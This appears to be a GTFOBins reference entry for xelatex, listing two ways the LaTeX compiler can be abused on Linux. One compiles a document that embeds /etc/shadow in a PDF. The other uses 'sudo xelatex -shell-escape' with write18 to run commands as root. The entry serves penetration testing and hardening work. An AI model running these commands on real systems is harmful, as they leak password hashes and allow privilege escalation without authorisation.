description: `xelatex` is a symbolic link to [`xetex`](/gtfobins/xetex/). However the program does not have the same behaviour regarding the name of argv[0].
functions:
  file-read:
    - code: |
        echo "\documentclass[12pt]{article} \usepackage{verbatim} \begin{document} \verbatiminput{/etc/shadow} \end{document}" > read.tex
        latexmk read.tex
        #/etc/shadow is in read.pdf
  sudo:
    - code: |
        echo "\documentclass[12pt]{article} \begin{document} \immediate\write18{/usr/bin/whoami} \end{document}" > file.tex
        sudo xelatex -shell-escape file.tex
